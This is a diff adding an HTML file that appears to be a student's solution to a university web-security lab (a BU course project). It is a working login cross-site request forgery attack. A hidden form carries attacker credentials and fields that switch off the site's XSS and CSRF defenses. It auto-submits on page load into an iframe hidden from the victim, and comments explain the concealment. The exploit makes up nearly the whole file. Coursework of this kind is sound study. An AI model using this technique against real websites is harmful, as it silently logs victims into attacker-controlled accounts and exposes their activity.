@@ -1,0 +1,27 @@
+<!-- This HTML file was made by Konstantino Sparakis --!>
+
+
+
+<!-- Loading in jquery from a CDN, requires active internet connection!-->
+<script src="https://code.jquery.com/jquery-1.12.3.min.js" integrity="sha256-aaODHAgvwQW1bFOGXMeX+pC4PZIPsvn2h1sArYOhgXQ=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.js" integrity="sha256-uEFhyfv3UgzRTnAZ+SEgvYepKKB0FW6RqZLrqfyUNug=" crossorigin="anonymous"></script>
+
+
+<!-- This form points to our target, post function, it is hidden and has our fake data, 
+by targeting out iframe we ensure that the page doesnt go to where the action is and it stays hidden.-->
+<form name="CSRF" method="POST" target="hiddeniframe" action="http://cs558web.bu.edu/project2/login">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+    <input type="hidden" name="xssdefense" value="0">
+    <input type="hidden" name="csrfdefense" value="0">
+</form>
+
+<iframe name="hiddeniframe"></iframe>
+
+<script>
+    //Submits the form
+    CSRF.submit()
+
+    //Hides the iframe from the users view
+    $("iframe[name=hiddeniframe]").hide();
+</script>
